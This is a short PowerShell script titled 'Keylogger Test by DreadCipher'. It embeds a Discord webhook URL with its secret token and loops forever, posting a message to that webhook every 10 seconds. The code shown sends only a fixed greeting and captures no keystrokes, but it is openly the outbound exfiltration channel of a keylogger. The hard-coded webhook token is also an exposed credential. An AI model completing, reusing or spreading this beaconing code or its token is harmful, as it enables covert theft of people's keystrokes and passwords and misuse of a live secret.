# Keylogger Test by DreadCipher
$webhook = "https://discord.com/api/webhooks/1356088174123941999/wNZonGi3auoF4cXA5ehPaIL_Rd8qVSFZIeUJPOHbg0WUSOlOBHXmzNK0lbx_ijZfyVcx"

while ($true) {
    Start-Sleep -Seconds 10
    $payload = @{ content = "Hello from the keylogger!" } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
}
